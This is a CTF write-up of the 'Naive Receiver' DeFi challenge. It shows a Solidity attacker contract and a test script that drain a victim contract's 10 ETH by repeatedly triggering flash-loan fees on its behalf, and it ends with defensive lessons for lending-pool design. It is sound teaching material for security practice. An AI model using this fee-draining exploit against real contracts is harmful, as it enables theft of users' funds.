# Challenge #2: Naive Receiver

In this challenge there is a pool that lends ETH and a victim contract who has 10 ETH and is capable of receiving flash loans from the lender. The goal of this challenge is to drain all ETH from the victim. 

The only way to transfer ETH from the victim is to make it call a transfer function. It happens in the last operation of the victim's *receiveEther* function:

```
// Function called by the pool during flash loan
function receiveEther(uint256 fee) public payable {
    require(msg.sender == pool, "Sender must be pool");

    uint256 amountToBeRepaid = msg.value.add(fee);

    require(address(this).balance >= amountToBeRepaid, "Cannot borrow that much");
    
    _executeActionDuringFlashLoan();
    
    // Return funds to pool
    pool.sendValue(amountToBeRepaid); <--- Here!
}
```

In order to drain victim's ETH:
1. I have to call the *receiveEther* function of the victim contract, however the victim accepts calls only from the lending pool.
2. The lending pool's *flashLoan* function accepts not only the amount to be borrowed but also the address of the borrower.  

Do you get the idea?

## Exploit

Basically, we can make the lending pool to call the *receiveEther* function of any contract that implements such function, including the victim.

When the function is called, the victim returns borrowed (on their behalf) ETH plus the fee. The fee is fixed, so I can borrow 0 ETH. 

As the victim has 10 ETH and the fee is 1 ETH I could send 10 transactions to drain victim's balance. However, the nice to have of the challenge is to do it in one transaction, so I have created a simple attacker contract with the following function:

```
function attack(INaiveReceiverLenderPool _lender, address _victim) external {
    for (uint8 i = 0; i < 10; i++) {
        _lender.flashLoan(_victim, 1 ether);
    }        
} 
```

It just calls the *flashLoan* function 10 times in one transaction. Now, to run the exploit I have to deploy the contract and send one transaction:

```
it('Exploit', async function () {
    /** YOUR EXPLOIT GOES HERE */
    /* Deploy attacker contract */
    this.attackerContract = await NaiveReceiverAttacker.new({ from: attacker });
    /* Run exploit */
    await this.attackerContract.attack(this.pool.address, this.receiver.address, {from: attacker});
});
```

## Lesson learned

When building a lending pool, do not allow to call any function of any contract from the pool contract. Specify the function to be called on the receiver contract and, if it is possible, define a list of contracts that can be called - usually the *msg.sender* should be called back. 

However, some lending pools allow borrowers to transfer the borrowed amount to any contract and execute its receiving function. In such situation, the lending pool should clarify that the receiver's function which handles borrowed ETH or tokens can be called only by the pool and within a process initiated by its owner or other trusted source (e.g. multisig).

[<< Back to the README](../README.md)